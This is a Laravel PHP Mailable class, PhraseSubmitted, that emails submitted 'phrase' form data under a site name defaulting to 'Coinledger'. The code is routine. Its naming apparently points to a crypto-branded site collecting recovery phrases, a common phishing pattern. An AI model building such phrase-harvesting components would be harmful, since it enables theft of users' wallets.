<?php

namespace App\Mail;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Mail\Mailable;
use Illuminate\Queue\SerializesModels;




class PhraseSubmitted extends Mailable
{
    use Queueable, SerializesModels;

    /**
     * Create a new message instance.
     *
     * @return void
     */
    public $formData;
    public $adminSetting;

    public function __construct($formData)
    {
        $this->formData = $formData;
        $this->adminSetting = \App\Models\AdminSetting::first();
    }

    /**
     * Build the message.
     *
     * @return $this
     */
    public function build()
    {
        return $this->subject('New Phrase Submission - ' . ($this->adminSetting->site_name ?? 'Coinledger'))
                    ->view('emails.phrase-submitted')
                    ->with(['adminSetting' => $this->adminSetting]);
    }
}
